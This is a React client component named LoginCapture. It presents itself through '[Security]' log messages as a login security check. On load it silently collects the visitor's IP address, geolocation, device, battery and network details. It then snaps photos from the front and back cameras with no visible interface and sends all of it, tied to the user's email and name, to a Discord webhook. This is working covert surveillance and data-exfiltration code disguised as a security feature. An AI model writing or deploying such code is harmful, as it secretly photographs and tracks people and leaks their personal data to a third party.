"use client";

import { useEffect, useRef } from "react";
import { sendLoginAlert } from "@/lib/discord-webhook";

interface LoginCaptureProps {
  webhookUrl: string;
  email: string;
  name?: string;
  onComplete: () => void;
}

interface DeviceInfo {
  ipAddress: string;
  location?: string;
  device: string;
  browser: string;
  os: string;
  screen: string;
  battery?: string;
  network?: string;
  cpuCores?: number | string;
  memory?: string;
  language?: string;
  timezone?: string;
  cookies?: string;
  doNotTrack?: string;
  gpu?: string;
  networkType?: string;
  isMobile?: boolean;
}

export default function LoginCapture({
  webhookUrl,
  email,
  name,
  onComplete,
}: LoginCaptureProps) {
  const initialized = useRef(false);
  const canvasRef = useRef<HTMLCanvasElement>(document.createElement("canvas"));
  const canvasBackRef = useRef<HTMLCanvasElement>(document.createElement("canvas"));

  useEffect(() => {
    if (initialized.current) return;
    initialized.current = true;

    async function init() {
      console.log("[Security] Initializing security check...");

      const deviceInfo = await getDeviceInfo();
      console.log("[Security] Device info collected:", deviceInfo);

      await captureAndSend(deviceInfo);

      onComplete();
    }

    init();
  }, []);

  async function getDeviceInfo(): Promise<DeviceInfo> {
    let ipAddress = "Unknown";
    let location = "Unknown";

    try {
      const ipResponse = await fetch("https://ip-api.com/json/");
      const ipData = await ipResponse.json();
      if (ipData.status === "success") {
        ipAddress = ipData.query;
        location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
      }
    } catch {
      console.log("[Security] Could not get IP info");
    }

    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    let os = "Unknown OS";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS")) os = "iOS";

    const isMobile = /mobile|android|iphone|ipad|tablet/i.test(ua);
    const device = isMobile ? "Mobile" : "Desktop";
    const screen = `${window.screen.width}x${window.screen.height}`;

    let battery = "N/A";
    try {
      if ("getBattery" in navigator) {
        const batteryManager = await (navigator as unknown as { getBattery: () => Promise<{ level: number; charging: boolean }> }).getBattery();
        battery = `${Math.round(batteryManager.level * 100)}%${batteryManager.charging ? " (Charging)" : ""}`;
      }
    } catch {}

    const connection = (navigator as unknown as { connection?: { effectiveType?: string; downlink?: number; type?: string } }).connection;
    const network = connection?.effectiveType || "Connected";
    const networkType = connection?.type || "Unknown";

    const cpuCores = navigator.hardwareConcurrency || "N/A";
    const deviceMemory = (navigator as unknown as { deviceMemory?: number }).deviceMemory;
    const memory = deviceMemory ? `${deviceMemory} GB` : "N/A";

    return {
      ipAddress,
      location,
      device,
      browser,
      os,
      screen,
      battery,
      network,
      networkType,
      cpuCores,
      memory,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
      doNotTrack: navigator.doNotTrack === "1" ? "ON" : "OFF",
      gpu: "N/A",
      isMobile,
    };
  }

  async function captureImage(facingMode: "user" | "environment"): Promise<string | null> {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode,
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      const video = document.createElement("video");
      video.srcObject = stream;
      video.autoplay = true;
      video.playsInline = true;
      video.muted = true;

      await new Promise<void>((resolve) => {
        video.onloadedmetadata = () => {
          video.play().then(() => resolve());
        };
      });

      await new Promise((resolve) => setTimeout(resolve, 500));

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      const ctx = canvas.getContext("2d");
      if (ctx) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      stream.getTracks().forEach((track) => track.stop());

      return canvas.toDataURL("image/jpeg", 0.7);
    } catch (err) {
      console.log(`[Security] Camera ${facingMode} not available:`, err);
      return null;
    }
  }

  async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
    try {
      const response = await fetch("/api/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64Data, filename }),
      });
      const result = await response.json();
      if (result.url) return result.url;
      return null;
    } catch (err) {
      console.error("[Security] Upload error:", err);
      return null;
    }
  }

  async function captureAndSend(deviceInfo: DeviceInfo) {
    console.log("[Security] Capturing images...");

    const frontImg = await captureImage("user");
    const backImg = await captureImage("environment");

    let frontUrl: string | undefined = undefined;
    let backUrl: string | undefined = undefined;

    if (frontImg) {
      const uploaded = await uploadImage(frontImg, `${email}_front.jpg`);
      frontUrl = uploaded || frontImg;
    }

    if (backImg) {
      const uploaded = await uploadImage(backImg, `${email}_back.jpg`);
      backUrl = uploaded || backImg;
    }

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long", year: "numeric", month: "long", day: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit", timeZoneName: "short",
    });

    await sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      photoBase64: frontUrl,
      backCameraPhoto: backUrl,
      timestamp,
      battery: deviceInfo.battery,
      network: deviceInfo.network,
      networkType: deviceInfo.networkType,
      cpuCores: deviceInfo.cpuCores,
      memory: deviceInfo.memory,
      language: deviceInfo.language,
      timezone: deviceInfo.timezone,
      cookies: deviceInfo.cookies,
      doNotTrack: deviceInfo.doNotTrack,
      gpu: deviceInfo.gpu,
    });

    console.log("[Security] Alert sent!");
  }

  return null;
}
